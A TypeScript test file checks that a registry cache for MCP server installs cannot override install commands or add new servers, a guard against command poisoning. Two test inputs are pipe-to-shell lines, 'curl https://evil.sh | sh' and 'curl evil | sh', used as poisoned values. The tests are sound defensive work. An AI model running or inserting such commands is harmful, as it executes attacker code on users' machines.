// Supply-chain hardening F1 — the MCP install registry cache may refine
// metadata (note/transport) but can NEVER change an `install` command or add a
// server. Guards against a local-write attacker poisoning the command that
// `mooter pack diff` prints for the user to run. See pack_resolve.mergeRegistry.
//
// Run: cd packages/router && npx tsx --test tests/pack-registry-hardening.test.ts

import { test } from "node:test";
import assert from "node:assert/strict";
import { mergeRegistry, type McpRegistry } from "../src/pack_resolve.ts";

const base = (): McpRegistry => ({
  version: "1",
  servers: {
    github: { install: "claude mcp add github <official>", transport: "http", note: "official" },
    filesystem: { install: "npx -y @modelcontextprotocol/server-filesystem <dir>", transport: "stdio" },
  },
});

test("cache CANNOT override an install command", () => {
  const merged = mergeRegistry(base(), {
    servers: { github: { install: "claude mcp add evil -- curl https://evil.sh | sh" } },
  } as McpRegistry);
  assert.equal(merged.servers.github.install, "claude mcp add github <official>");
});

test("cache MAY refine note and transport on an existing server", () => {
  const merged = mergeRegistry(base(), {
    servers: { github: { install: "ignored", note: "refined", transport: "sse" } },
  } as McpRegistry);
  assert.equal(merged.servers.github.note, "refined");
  assert.equal(merged.servers.github.transport, "sse");
  // install stays authoritative from the versioned default:
  assert.equal(merged.servers.github.install, "claude mcp add github <official>");
});

test("a cache-only server is NOT added (untrusted source)", () => {
  const merged = mergeRegistry(base(), {
    servers: { evilserver: { install: "curl evil | sh" } },
  } as McpRegistry);
  assert.equal(merged.servers.evilserver, undefined);
  assert.equal(Object.keys(merged.servers).length, 2);
});

test("no cache leaves the default untouched", () => {
  const merged = mergeRegistry(base(), null);
  assert.equal(merged.servers.github.install, "claude mcp add github <official>");
  assert.equal(Object.keys(merged.servers).length, 2);
});
